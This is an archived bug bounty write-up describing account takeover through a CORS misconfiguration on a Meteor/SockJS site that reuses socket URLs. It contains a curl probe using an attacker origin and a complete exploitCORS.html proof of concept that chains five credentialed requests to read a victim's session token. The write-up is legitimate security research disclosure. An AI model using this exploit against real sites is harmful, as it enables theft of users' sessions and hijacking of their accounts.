---
source: imported
source_type: markdown
original_path: knowledge-inbox/blogs-incoming/2018-01-25_full-account-takeover-through-cors-with-connection-sockets_2.md
original_filename: 2018-01-25_full-account-takeover-through-cors-with-connection-sockets_2.md
title: Full Account Takeover through CORS with connection Sockets
category: documents
detected_topics:
- cors
- idor
- ssrf
- command-injection
- otp
- csrf
tags:
- imported
- documents
- cors
- idor
- ssrf
- command-injection
- otp
- csrf
language: en
raw_sha256: df469a1b20ae5103383ecbf907d38caac95358773dd6ce1219bfe3b787dc4e8e
text_sha256: 4de119b74800d90a84023c6bffb7a8b256a4e8cfcb55b672e5648ae1ea6d3918
ingested_at: '2026-06-28T07:31:56Z'
sensitivity: unknown
redactions_applied: false
---

# Full Account Takeover through CORS with connection Sockets

## Source Metadata

- Original Path: knowledge-inbox/blogs-incoming/2018-01-25_full-account-takeover-through-cors-with-connection-sockets_2.md
- Source Type: markdown
- Detected Topics: cors, idor, ssrf, command-injection, otp, csrf
- Ingested At: 2026-06-28T07:31:56Z
- Redactions Applied: False
- Raw SHA256: `df469a1b20ae5103383ecbf907d38caac95358773dd6ce1219bfe3b787dc4e8e`
- Text SHA256: `4de119b74800d90a84023c6bffb7a8b256a4e8cfcb55b672e5648ae1ea6d3918`


## Content

---
title: "Full Account Takeover through CORS with connection Sockets"
url: "https://medium.com/@saamux/full-account-takeover-through-cors-with-connection-sockets-179133384815"
authors: ["Samuel (@saamux)"]
bugs: ["CORS misconfiguration", "Account takeover"]
publication_date: "2018-01-25"
added_date: "2022-09-15"
source: "pentester.land/writeups.json"
original_index: 5996
scraped_via: "browseros"
---

# Full Account Takeover through CORS with connection Sockets

Top highlight

Full Account Takeover through CORS with connection Sockets
Samuel
Follow
6 min read
·
Jan 25, 2018

775

3

Hello guys , I’ll share with you an interesting bug in a private program of HackerOne.

I had arrived to my house on Friday and received an invitation from HackerOne to join in private program, immediately started doing recognition on the platforms of the program, well, I found an interesting website where had a good bugs (IDOR, CSRF), however, I wanted looking for the biggest bug in the website, so, I tried to exploit a different logical flaws, some SSRF with XSPA, but I didn’t succeed :(.

Once the whole website was mapped, I tried to see if I could exploit a CORS type bug (if you want to learn about CORS, you could read this article https://developer.mozilla.org/en-US/docs/Web/HTTP/CORS). When I made a request with a different Origin, I got the following:

Request

curl -v -X GET http://privatewebsite.com -H ‘Origin: http://evilwebsite.com’

Response

HTTP/1.1 200 OK
Cache-Control: no-store, no-cache, no-transform, must-revalidate, max-age=0
Access-Control-Allow-Credentials: true
Access-Control-Allow-Origin: http://evilwebsite.com
Vary: Origin
Content-Type: application/javascript; charset=UTF-8
Date: Wed, 24 Jan 2018 21:56:33 GMT
Connection: close

As you can see, the website was vulnerable to CORS, since it allowed a connection from another source and also returned the header Access-Control-Allow-Credentials : true which allows exploitation to be successful. Then, I started to create the exploit, but I realized that every time I tried to extract anything from the site, it was not possible, since connections were being made by sockets that only worked once.

For example, I made a request

Press enter or click to view image in full size
Press enter or click to view image in full size
First Response

When I tried to perform this request again with the same URI, the following happened:

Press enter or click to view image in full size

As you can see, it is not possible to reuse the same URL, or if it is true, if it was possible, but you had to wait about 10 minutes for that socket connection to die to be able to use it again, and therefore that does not make sense (if we put ourselves on the attacker’s side). Then, it occurred to me that modifying the URI by any other value, it was possible to use the socket again as a new one. For example,

Socket Used

http://privatewebsite.com/sockjs/669/lsbw5zgh/xhr

I changed the URI

http://privatewebsite.com/sockjs/123/lsbwabcd/xhr

New sockect accepted :).

Until then, he had already managed to exploit the CORS, since I could generate any URI and send it through CORS to the victim, and this person when opening the link, could have captured the information of his session. I continued studying the behavior of the website, and I noticed something very interesting, when I entered any resource on the website, 5 requests were loaded by Sockets, which were related to each other.

Press enter or click to view image in full size
Interesting Request

In the fifth request you can see a lot of confidential information about the user, among them, the user, the session token (if this was captured an attacker could obtain the session of a user.) Therefore, an exploit should be created in CORS which I would have to do each of these 5 requests until I get to the last one and that way I could get that information from the user.You’ll be wondering, why did not you just do a CORS exploit with just that request? It happens that each of these requests is linked to each other and if only the last one was executed, the necessary verification of the other 4 request would not be carried out.

First request

Press enter or click to view image in full size
Press enter or click to view image in full size

Second request

Press enter or click to view image in full size
Press enter or click to view image in full size

Third Request

Press enter or click to view image in full size
Press enter or click to view image in full size

Fourth Request

Press enter or click to view image in full size

The information by POST, could be captured by the attacker through various types of MITM attacks, Phishing, etc. (This is because the website does not have an SSL certificate).

Get Samuel’s stories in your inbox

Join Medium for free to get updates from this writer.

Subscribe

Remember me for faster sign in

Fifth Request

Press enter or click to view image in full size
Press enter or click to view image in full size

If it has not been very clear, I will explain it again, when you enter any resource on the website, these 5 requests are loaded through the socket, which complement each other, therefore what I did next was create an exploit in CORS which replicates each of these requests, this is sent to the victim and later it is possible to obtain their information.

exploitCORS.html

<!DOCTYPE html>
<html>
<head><title>Exploiting CORS</title></head>
<body>
<center>
<h1>Getting your information through CORS</h1>
<button type="button" onclick="ProcessUrls()">Exploit</button>
</div>
<script type="text/javascript">
var cont = 0;
  var requests = new Array();  
  function ProcessUrls()
  {
  requests = new Array();
  var urls = new Array('http://privatewebsite.com/sockjs/203/jb93ne78/xhr','http://privatewebsite.com/sockjs/203/jb93ne78/xhr_send','http://privatewebsite.com/sockjs/203/jb93ne78/xhr', 'http://privatewebsite.com/sockjs/203/jb93ne78/xhr_send','http://privatewebsite.com/sockjs/203/jb93ne78/xhr');
for(i=0;i<urls.length;i++)
  {
  requests.push(new ProcessUrl(urls[i]));  
  }
}
function ProcessUrl(url)
  {
  cont+=1;  
  if (cont == 2 ){
  var http = new XMLHttpRequest();
  http.open("POST", url, true);
  http.withCredentials = true;
  http.onreadystatechange = function() 
  {
  if (http.readyState == 4 && http.status == 204) 
  { 
  http.responseText 
  }
  };
  http.setRequestHeader("Content-Type", "text/plain;charset=UTF-8");
  http.send('["{\\"msg\\":\\"connect\\",\\"version\\":\\"1\\",\\"support\\":[\\"1\\",\\"pre2\\",\\"pre1\\"]}"]');
}
else if (cont == 4 ){
  var http = new XMLHttpRequest();
  http.open("POST", url, true);
  http.withCredentials = true;
  http.onreadystatechange = function() 
  {
  if (http.readyState == 4 && http.status == 204) 
  {
  http.responseText  
  }
  };
  http.setRequestHeader("Content-Type", "text/plain;charset=UTF-8");
  http.send('["{\\"msg\\":\\"method\\",\\"method\\":\\"login\\",\\"params\\":[{\\"resume\\":\\"abcabcabcabcabcabcabcabcabcabcabcabcabcabca\\"}],\\"id\\":\\"1\\"}","{\\"msg\\":\\"sub\\",\\"id\\":\\"hihihihihihihihi\\",\\"name\\":\\"meteor.loginServiceConfiguration\\",\\"params\\":[]}","{\\"msg\\":\\"sub\\",\\"id\\":\\"yzyzyzyzyzyzyzyzy\\",\\"name\\":\\"meteor_autoupdate_clientVersions\\",\\"params\\":[]}","{\\"msg\\":\\"sub\\",\\"id\\":\\"efefefefefefefefe\\",\\"name\\":\\"hooks\\",\\"params\\":[]}"]');
}
else if (cont == 5) { 
  var http = new XMLHttpRequest();
  http.open("POST", url, true); 
  http.withCredentials = true;
  http.onreadystatechange = function() 
  {
  if (http.readyState == 4 && http.status == 200 || http.readyState == 4 && http.status == 204 ) 
  {  
  alert(http.responseText)
  }
  };
http.send();  
  }
else { 
  var http = new XMLHttpRequest();
  http.open("POST", url, true); 
  http.withCredentials = true;
  http.onreadystatechange = function() 
  {
  if (http.readyState == 4 && http.status == 200 || http.readyState == 4 && http.status == 204 ) 
  {  
  http.responseText
  }
  };
http.send();  
  }  
  }
</script>

The exploit will perform the 5 socket request, therefore when executing this you get the following

Press enter or click to view image in full size
Press enter or click to view image in full size

It’s working. Through this, you could use the session token to take control of another user’s account :D.

The vulnerability was accepted by the program and I was rewarded :).

Thanks

@saamux
